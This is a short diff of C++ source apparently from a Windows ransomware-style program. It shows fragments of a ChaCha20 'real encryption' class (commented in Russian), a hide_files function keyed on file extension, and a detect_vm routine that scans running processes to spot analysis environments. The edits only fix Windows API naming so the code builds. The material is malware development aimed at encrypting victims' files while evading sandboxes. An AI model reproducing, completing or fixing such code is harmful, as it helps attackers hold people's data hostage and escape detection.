@@ -105,7 +105,7 @@ public:
 };
 
 // ============================================================
-// РЕАЛЬНОЕ ШИФРОВАНИЕ ChaCha20 (OpenSSL) — замена Salsa20
+// РЕАЛЬНОЕ ШИФРОВАНИЕ ChaCha20 (OpenSSL)
 // ============================================================
 class ChaCha20 {
 private:
@@ -240,9 +240,9 @@ void hide_files(const std::string& ext) {
 bool detect_vm() {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32A pe;
+        PROCESSENTRY32 pe;
         pe.dwSize = sizeof(pe);
-        if (Process32FirstA(snap, &pe)) {
+        if (Process32First(snap, &pe)) {
             do {
                 std::string name = pe.szExeFile;
                 std::transform(name.begin(), name.end(), name.begin(), ::tolower);
@@ -253,7 +253,7 @@ bool detect_vm() {
                     CloseHandle(snap);
                     return true;
                 }
-            } while (Process32NextA(snap, &pe));
+            } while (Process32Next(snap, &pe));
         }
         CloseHandle(snap);
     }
